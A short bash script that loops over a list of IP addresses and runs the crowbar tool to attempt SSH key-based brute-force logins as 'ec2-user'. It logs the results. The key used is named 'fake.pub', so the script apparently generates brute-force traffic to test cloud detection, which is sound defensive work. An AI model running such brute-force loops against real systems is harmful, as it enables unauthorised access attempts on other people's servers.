#!/bin/bash
echo "---------- Running SSH Bruteforce ---------- "
filename='/tools/ips.txt'
filelines=`cat $filename`
echo Start
for ip in $filelines ; do
        python /tools/crowbar/crowbar.py -b sshkey -s $ip/32 -u ec2-user -k ./fake/fake.pub >> /var/log/bruteforce-ssh &
        echo "python /tools/crowbar/crowbar.py -b sshkey -s $ip/32 -u ec2-user -k ./fake/fake.pub"
done
